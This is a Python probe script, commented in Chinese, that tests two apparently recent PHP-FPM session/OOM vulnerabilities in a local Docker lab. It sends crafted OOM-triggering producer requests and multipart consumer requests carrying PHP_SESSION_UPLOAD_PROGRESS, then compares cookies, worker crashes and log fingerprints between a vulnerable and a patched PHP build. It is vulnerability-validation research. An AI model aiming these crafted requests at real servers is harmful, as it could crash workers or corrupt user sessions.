#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""probe_84.py — CVE-2026-109618 / CVE-2026-109619 FPM 路径验证探针（8.4.26 vs 8.4.27 A/B）。

攻击面约束：**只有 nginx:80（compose 里唯一发布的端口）**。fpm:9000 在 compose
网络内部，不对宿主机发布 —— 模拟真实生产 nginx+php-fpm 暴露面。

按 2026-10-21 公告（GHSA-6wmf-4rv5-p3rp）给出的**已验证 FPM 路径**设计：
  生产者（请求 A）：startup 成功后进入执行阶段，发布请求持有的全局状态
    （session_start() 写 $_SESSION），随后 fatal（OOM）打断匹配的 reset；
  消费者（请求 B）：multipart 带 PHP_SESSION_UPLOAD_PROGRESS，rfc1867 回调在
    正常 RINIT 之前触碰残留的 session 全局态（PS(id)/PS(http_session_vars)）。

CVE-2026-109618（OOM longjmp）变体：OOM 打进请求关闭阶段（RSHUTDOWN 的
  ps_write 序列化 / shutdown 函数），shutdown 过程消费半初始化态。
  变体 P3（shutdown 函数内 OOM）同时是 109618 的"shutdown 消费无效状态"和
  109619 的"fatal 打断 reset"两个面的组合。

观测通道（全部纯 HTTP 可见）：
  1. 消费者 Set-Cookie —— NORMAL（26-34 hex）/ NO-COOKIE / GARBAGE；
  2. fpm child PID（docker top）—— 存活 / 死亡（SIGSEGV/SIGABRT）；
  3. docker logs —— OOM fatal / segfault / warning 指纹。

判定必须有基线：重启 fpm 拿干净 child（无生产者）下消费者行为作为对照，
与"生产者之后"的行为逐轮比较；行为偏离基线才算 stale-state 消费证据。
用 8.4.27（含补丁）跑同样脚本应全部"无差异"——这是负对照。

用法：
  python3 tools84/probe_84.py --variant p1 [--rounds 3]
  python3 tools84/probe_84.py --variant p3 --rounds 3
  变体: p1=执行阶段 OOM fatal（109619 经典 producer）
        p2=执行阶段 fatal + shutdown 函数在 OOM 后仍被调用（109618 面）
        p3=OOM 落在 shutdown 阶段（RSHUTDOWN 内序列化 OOM）
"""

from __future__ import annotations

import argparse
import re
import subprocess
import sys
import os
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from exploit import Target, build_multipart  # noqa: E402

URL = "http://127.0.0.1:8090/index.php"
FPM = "php84-fpm"

# 生产者靶场页 GET /prod.php?v=p1|p2|p3|p4|p4a|p5（见 docker84/www/prod.php）
PRODUCER_PATH = {
    "p1": "/prod.php?v=p1",    # 执行阶段 OOM：session 发布 -> str_repeat OOM
    "p2": "/prod.php?v=p2",    # 执行阶段 OOM + register_shutdown_function 复活观察
    "p3": "/prod.php?v=p3",    # OOM 落在 RSHUTDOWN 的 ps_write 序列化（109618 面）
    "p3s": None,               # 特殊：mk/p3/rd 三段式会话落盘 A/B（见 run_p3s）
    "p4": "/prod.php?v=p4",    # $_SESSION 内对象 __destruct OOM：bailout 落在
                               # php_rshutdown_session_globals 的 zval_ptr_dtor 内、
                               # ZVAL_UNDEF 之前（109619 唯一残留路径，源码定位）
    "p4a": "/prod.php?v=p4a",  # p4 控制组：析构不 OOM，child 应正常存活无残留
    "p5": "/prod.php?v=p5",    # 执行期 OOM 无 session：边界对照（两版应一致）
}


def sh(*args: str) -> str:
    r = subprocess.run(list(args), capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def child_pid() -> str:
    """读 fpm child 的 host PID（docker top 输出里 ppid 指向 master 的行）。"""
    out = subprocess.run(
        ["docker", "top", FPM, "-eo", "pid,ppid,comm"],
        capture_output=True, text=True,
    ).stdout.strip().splitlines()[1:]
    pids = {}
    for line in out:
        f = line.split()
        if len(f) >= 3:
            pids[f[0]] = f[1]
    for pid, ppid in pids.items():
        if ppid in pids and pid != "1":
            return pid
    return out[-1].split()[0] if out else "?"


def logs_tail(n: int = 25) -> str:
    return sh("docker", "logs", "--tail", str(n), FPM)


def restart_fpm() -> None:
    subprocess.run(["docker", "restart", FPM], capture_output=True)
    time.sleep(2.0)


def producer(variant: str) -> tuple[str, bytes]:
    """生产者：GET /prod.php?v=<variant>。返回 (status_line, body)。"""
    t = Target(URL, timeout=120.0, verbose=False)
    code, body = t.get(PRODUCER_PATH[variant], read_cap=1 << 20)
    return str(code), body


def consumer(sid_data: bytes = b"\x00") -> tuple[str, bytes]:
    """消费者：multipart 带 PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS（无文件 part）。

    rfc1867 的 FORMDATA 钩子在解析到 PHP_SESSION_UPLOAD_PROGRESS 字段时即调
    php_session_initialize()（早于 RINIT）；PS(id) 取自同表单的 PHPSESSID 字段。
    sid_data 传 None 时省略 PHPSESSID part（用表单外的干净形状做对照）。
    b"\\x00" -> 空 id -> 生成新 id 并 Set-Cookie（基线=NORMAL 的形状）。
    """
    parts = []
    if sid_data is not None:
        parts.append({"name": "PHPSESSID", "data": sid_data})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
    t = Target(URL, timeout=90.0, verbose=False)
    resp = t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                  read_cap=1 << 20, timeout=90.0)
    m = re.match(rb"HTTP/1\.[01] (\d{3})", resp)
    return (m.group(1).decode() if m else "0"), resp


def cookie_of(resp: bytes) -> str:
    m = re.search(rb"Set-Cookie:\s*PHPSESSID=([^;\r\n]+)", resp, re.I)
    return m.group(1).decode("latin1", "replace") if m else ""


def classify(cookie: str) -> str:
    if not cookie:
        return "NO-COOKIE"
    if re.fullmatch(r"[0-9a-f]{26,34}", cookie):
        return "NORMAL"
    return "GARBAGE"


def run_p3s(rounds: int) -> bool:
    """p3s 三段式：mk(建会话) -> p3(RSHUTDOWN encode 处 OOM) -> rd(回读判定)。

    CVE-2026-109618 的纯 HTTP 可观测 A/B 差异（会话语义）：
      8.4.26（含漏洞）：encode 分配点立即 fatal bailout，被 php_session_flush
        的 zend_try 吞掉 => s_write 永不执行 => rd 回读 pad=0（写盘被静默
        丢弃，"shutdown 处理半初始化态"）。p3 响应含 "in <b>Unknown</b>"。
      8.4.27（修复）：超软限只排队 delayed_oom，encode 分配继续成功 =>
        4MB 会话完整落盘 => rd 回读 pad=4194304。p3 响应干净无 fatal。
    """
    print(f"\n{'=' * 62}\n[*] variant p3s: mk -> p3(4MB pad) -> rd\n{'=' * 62}")
    hits = 0
    for i in range(rounds):
        # sid 只能用 [0-9a-z]：use_strict_mode 会拒绝含下划线等字符的 id
        sid = "probe{:08d}{:02d}".format(int(time.time() * 1000) % 10**8, i)
        t = Target(URL, timeout=90.0, verbose=False)
        code, b_mk = t.get(f"/prod.php?v=mk&sid={sid}", read_cap=1 << 18)
        code, b_p3 = t.get(f"/prod.php?v=p3&sid={sid}", read_cap=1 << 18)
        code, b_rd = t.get(f"/prod.php?v=rd&sid={sid}", read_cap=1 << 18)
        m = re.search(rb"pad=(\d+)", b_rd)
        pad = int(m.group(1)) if m else -1
        fatal_unknown = b"in <b>Unknown</b>" in b_p3
        verdict = ("SESSION-LOST(pad=0)" if pad == 0
                   else "SESSION-WRITTEN(pad>0)" if pad > 0 else "rd-unparseable")
        print(f"[round {i}] sid={sid} p3-fatal-in-Unknown={fatal_unknown} "
              f"rd: {b_rd[:60]!r} -> {verdict}")
        if pad == 0 or fatal_unknown:
            hits += 1
    print(f"\n[=] p3s: rounds={rounds} session-lost/fatal-unknown hits={hits}")
    return hits > 0


def run_variant(variant: str, rounds: int) -> bool:
    print(f"\n{'=' * 62}\n[*] variant {variant}: {PRODUCER_PATH[variant]}\n{'=' * 62}")
    restart_fpm()
    base_pid = child_pid()
    print(f"[*] clean child pid: {base_pid}")

    # ---- 基线：干净 child、无生产者，直接发消费者（3 种形状各 1 次）----
    base_set = set()
    for label, sid in [("empty-sid", b"\x00"), ("garbage-sid", b"Z" * 32),
                       ("no-sid", None)]:
        st, resp = consumer(sid)
        ck = cookie_of(resp)
        base_set.add(classify(ck))
        print(f"[baseline {label}] {st} cookie={ck[:40]!r} -> {classify(ck)}")
    baseline_set = base_set
    baseline = "/".join(sorted(base_set))
    if base_set == {"NO-COOKIE"}:
        print("[!] 基线全部 NO-COOKIE：该形状不触发 Set-Cookie，NO-COOKIE 不能作证据。")
    print(f"[*] baseline set: {baseline}")

    diffs = 0
    for i in range(rounds):
        pid0 = child_pid()
        st, body = producer(variant)
        oom = b"Allowed memory size" in body
        died = b"child exited" in body or b"exited on signal" in body
        pid1 = child_pid()
        print(f"[round {i}] producer({variant}): {st} "
              f"OOM-fatal={'yes' if oom else 'NO'} "
              f"child {pid0}->{'survived' if pid0 == pid1 else 'DIED'}")
        if pid0 != pid1 or died:
            print(f"[!] 生产者 child 未存活 —— p4 的残留前提被破坏，"
                  f"检查 docker logs：{logs_tail(6)}")

        # 消费者轮换 3 种形状：空 sid / 垃圾 sid / 无 PHPSESSID part
        shapes = [("empty-sid", b"\x00"), ("garbage-sid", b"Z" * 32), ("no-sid", None)]
        for label, sid in shapes:
            cst, cresp = consumer(sid)
            ck = cookie_of(cresp)
            cls = classify(ck)
            pid2 = child_pid()
            mark = ""
            if cls not in baseline_set:
                diffs += 1
                mark = "  <== DIFFERS FROM BASELINE"
            print(f"[round {i}] consumer[{label}]: {cst} cookie={ck[:40]!r} "
                  f"-> {cls}{mark} "
                  f"child {pid1}->{'survived' if pid1 == pid2 else 'DIED'}")
            if pid1 != pid2:
                print(f"[!] 消费者导致 child 死亡 —— 残留状态消费的崩溃信号，"
                      f"logs: {logs_tail(8)}")
                pid1 = child_pid()  # 后续轮用新 pid 继续

    logs = logs_tail(15)
    for sig in ("SIGSEGV", "Segmentation", "signal Segmentation", "signal Abort",
                "zend_mm", "panic"):
        if sig.lower() in logs.lower():
            print(f"[*] log fingerprint: {sig}")
            break

    print(f"\n[=] {variant}: rounds={rounds} baseline={baseline} diffs={diffs}")
    return diffs > 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--variant", default="p1", choices=list(PRODUCER_PATH),
                    help="生产者变体（见 docstring）")
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--all", action="store_true", help="依次跑全部变体")
    args = ap.parse_args()

    variants = list(PRODUCER_PATH) if args.all else [args.variant]
    results = {}
    for v in variants:
        results[v] = run_p3s(args.rounds) if v == "p3s" else run_variant(v, args.rounds)

    print("\n" + "=" * 62)
    print("[*] summary:")
    for v, hit in results.items():
        print(f"    {v}: {'STALE-STATE OBSERVABLE' if hit else 'no difference'}")
    return 0 if any(results.values()) else 1


if __name__ == "__main__":
    sys.exit(main())
